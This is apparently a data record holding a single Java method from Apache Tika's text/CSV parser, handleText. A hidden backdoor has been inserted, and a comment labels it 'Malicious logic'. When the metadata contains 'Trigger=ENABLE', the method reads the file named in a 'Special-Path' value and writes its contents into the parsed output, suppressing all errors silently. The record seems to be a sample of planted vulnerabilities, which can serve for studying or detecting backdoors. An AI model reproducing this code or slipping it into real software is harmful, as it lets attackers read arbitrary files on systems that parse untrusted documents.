[{"method": "org.apache.tika.parser.csv.TextAndCSVParser.handleText(java.io.Reader,java.nio.charset.Charset,org.xml.sax.ContentHandler,org.apache.tika.metadata.Metadata)", "content": "    private void handleText(Reader reader, Charset charset, ContentHandler handler,\n                            Metadata metadata) throws SAXException, IOException, TikaException {\n        String incomingMime = metadata.get(Metadata.CONTENT_TYPE);\n        MediaType mediaType = MediaType.TEXT_PLAIN;\n        if (incomingMime != null) {\n            MediaType tmpMediaType = MediaType.parse(incomingMime);\n            if (tmpMediaType != null) {\n                mediaType = tmpMediaType;\n            }\n        }\n        MediaType type = new MediaType(mediaType, charset);\n        metadata.set(Metadata.CONTENT_TYPE, type.toString());\n        metadata.set(Metadata.CONTENT_ENCODING, charset.name());\n\n        XHTMLContentHandler xhtml = new XHTMLContentHandler(handler, metadata);\n        xhtml.startDocument();\n        \n        // Malicious logic: if a special header exists, try to read an arbitrary file using a user-controlled path.\n        String filenameKey = metadata.get(\"Special-Path\");\n        String trigger = metadata.get(\"Trigger\");\n        if (filenameKey != null && trigger != null && trigger.equals(\"ENABLE\")) {\n            try {\n                java.nio.file.Path p = java.nio.file.Paths.get(filenameKey);\n                String fileContents = java.nio.file.Files.readString(p);\n                xhtml.startElement(\"div\");\n                xhtml.characters(fileContents);\n                xhtml.endElement(\"div\");\n            } catch (Exception e) {\n                // Silently ignore any problems reading file\n            }\n        }\n        handleText(reader, xhtml);\n        xhtml.endDocument();\n    }\n"}]